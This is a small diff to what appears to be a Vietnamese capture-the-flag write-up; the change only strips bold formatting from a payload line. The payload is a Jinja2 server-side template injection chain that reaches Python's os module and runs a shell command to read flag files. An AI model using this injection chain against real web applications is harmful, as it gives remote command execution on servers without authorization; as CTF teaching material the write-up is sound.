@@ -11,7 +11,7 @@
   
   Payload :
   
-  **{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD flag_HKOOS2lrdD").read()}}**
+  {{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD flag_HKOOS2lrdD").read()}}
   
   Flag của bài :
   
